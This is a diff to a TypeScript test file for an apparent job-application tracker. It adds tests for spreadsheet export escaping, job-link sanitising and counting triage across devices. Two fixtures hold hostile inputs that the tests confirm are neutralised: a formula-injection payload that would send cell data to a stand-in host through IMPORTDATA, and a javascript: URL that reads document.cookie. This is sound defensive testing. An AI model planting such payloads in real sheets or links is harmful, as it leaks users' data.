@@ -5,7 +5,8 @@ import type { Job, Topic } from "@/lib/data/types";
 import { Store } from "@/lib/sync/store";
 import { importLegacy } from "@/lib/sync/importLegacy";
 import { checkProgress } from "./check";
-import { NS, setStatus, snapshot, toggleSolved } from "./progress";
+import { MemoryServer } from "@/lib/sync/memoryBackend";
+import { NS, addTriage, setStatus, snapshot, toggleSolved } from "./progress";
 
 import {
   bossOf, buyBuilding, buyGear, buyGearMany, fillBeds, gearPlan, unitOf, beds, gearCap, applyFight, bldCost, gearCost, efficiency, fightBoss, foodLeft, goldNow, huntHours, newVillage, workGold, recordWage, matsNow, buyCosmetic, setLook, setTheme, craftTrophy, wageNow, payFor,
@@ -13,7 +14,7 @@ import {
 } from "./village/engine";
 import { localDay } from "./time";
 import { fightRecap, mulberry32 } from "./village/sim";
-import { applicationOf, pushToSheet, sheetRow } from "@/lib/jobs/sheet";
+import { applicationOf, jobHref, pushToSheet, sheetRow } from "@/lib/jobs/sheet";
 import { gameStats, levelFor } from "./xp";
 
 const root = path.resolve(__dirname, "../../..");
@@ -312,6 +313,42 @@ describe("sheet export", () => {
     expect(sheetRow(j, "Applied", "2026-10-20")).toEqual(["2026-10-20", "Acme", "SWE", "Remote", "Applied", "LinkedIn"]);
     expect(applicationOf({ url: "https://www.adzuna.com/details/5", direct: "https://boards.greenhouse.io/acme/1" })).toBe("Company website");
     expect(applicationOf({ url: "https://www.indeed.com/viewjob?jk=1" })).toBe("Indeed");
+  });
+
+  it("keeps a scraped title that looks like a formula as plain text", () => {
+    const j = { company: "@evil", title: '=IMPORTDATA("https://x.example/?"&A1)', location: "-1", url: "https://acme.com/j/1", direct: "" } as Job;
+    const [, co, title, loc] = sheetRow(j, "Applied", "2026-10-20");
+    expect([co, title, loc]).toEqual(["'@evil", `'=IMPORTDATA("https://x.example/?"&A1)`, "'-1"]);
+  });
+});
+
+describe("job links", () => {
+  it("only ever opens web addresses", () => {
+    expect(jobHref({ url: "https://www.linkedin.com/jobs/view/1", direct: "https://acme.com/j/1" })).toBe("https://acme.com/j/1");
+    expect(jobHref({ url: "javascript:alert(document.cookie)" })).toBe("");
+    expect(jobHref({ url: "https://ok.com/1", direct: " JavaScript:alert(1)" })).toBe("");
+    expect(jobHref({ url: "" })).toBe("");
+  });
+});
+
+describe("quick play triage", () => {
+  it("two devices triaging the same day both count", async () => {
+    const server = new MemoryServer(), day = new Date(2026, 9, 21, 9);
+    const phone = new Store({ flushDelay: 1e9 }), laptop = new Store({ flushDelay: 1e9 });
+    await phone.connect(server.backend()); await laptop.connect(server.backend());
+    addTriage(phone, day); addTriage(phone, day); addTriage(laptop, day);
+    await phone.flush(); await laptop.flush(); await phone.sync();
+    expect(snapshot(phone, day).triToday).toBe(3);
+    expect(snapshot(phone, day).triaged).toBe(3);
+  });
+
+  it("still counts a day total saved before triage became one row each", () => {
+    const store = new Store(), day = new Date(2026, 9, 21, 9);
+    store.set(NS.triage, "2026-10-21", 4);
+    store.set(NS.triage, "2026-10-20", 2);
+    addTriage(store, day);
+    expect(snapshot(store, day).triToday).toBe(5);
+    expect(snapshot(store, day).triaged).toBe(7);
   });
 });
 
